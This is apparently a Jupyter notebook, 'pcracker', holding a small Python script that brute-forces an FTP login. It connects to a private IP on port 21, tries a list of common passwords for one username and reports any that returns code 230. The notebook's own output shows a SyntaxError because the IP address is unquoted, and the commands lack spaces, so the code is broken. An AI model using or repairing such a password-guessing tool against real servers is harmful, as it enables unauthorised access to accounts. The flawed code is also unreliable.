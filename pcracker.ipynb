{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (<ipython-input-1-203a96295c66>, line 10)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;36m  File \u001b[1;32m\"<ipython-input-1-203a96295c66>\"\u001b[1;36m, line \u001b[1;32m10\u001b[0m\n\u001b[1;33m    sample.connect((192.168.1.105,21))\u001b[0m\n\u001b[1;37m                            ^\u001b[0m\n\u001b[1;31mSyntaxError\u001b[0m\u001b[1;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "\n",
    "import re\n",
    "\n",
    "import sys\n",
    "\n",
    "def connect(username,password):\n",
    "    sample = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
    "    print(\"[*]Checking \" + username + \":\" + password)\n",
    "    sample.connect((192.168.1.105,21))\n",
    "    data = sample.recv(1024)\n",
    "    sample.send('USER' + username + '\\r\\n')\n",
    "    data = sample.recv(1024)\n",
    "    sample.send('PASS' + password + '\\r\\n')\n",
    "    data = sample.recv(3)\n",
    "    sample.send('QUIT \\r\\n')\n",
    "    sample.close()\n",
    "    return data\n",
    "\n",
    "username = (\"SampleName\")\n",
    "passwords = [\"123\",\"ftp\",\"root\",\"admin\",\"test\",\"backup\",\"password\"]\n",
    "\n",
    "for password in passwords:\n",
    "    attempt = connect(username,password)\n",
    "    if attempt == \"230\":\n",
    "        print(\"[*] password found:\" + password)\n",
    "\n",
    "sys.exit()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
